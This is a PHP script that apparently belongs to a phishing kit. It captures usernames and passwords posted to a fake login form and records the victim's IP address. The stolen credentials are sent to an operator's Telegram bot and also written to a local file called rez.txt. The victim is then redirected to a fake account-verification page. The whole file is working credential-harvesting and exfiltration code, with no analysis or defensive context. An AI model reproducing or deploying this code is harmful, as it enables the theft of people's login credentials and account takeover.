<?php
ini_set("output_buffering",4096);
session_start();
ob_start();

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

$_SESSION['USER'] = $_POST['USER'];
$_SESSION['PASSWORD'] = $_POST['PASSWORD'];


$zabi = getenv("REMOTE_ADDR");
$message .= "--------------  LOGIN  -------------\n";
$message .= "Onlineid : ".$_POST['USER']."\n";
$message .= "Password : ".$_POST['PASSWORD']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
include ('telegram.php');
if($telegram == 'on')
{
    $i=0;
    while ($i != $sendnum){

    
    $send = ['chat_id'=>$chatid,'text'=>$message];
    $web_telegram = "https://api.telegram.org/{$token}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    $i = $i+1;
}
}

$file = fopen("rez.txt", 'a');
fwrite($file, $message);

$Logon="de.html?cmd=_account-details&verify=$host";
header("location: $Logon");
?>
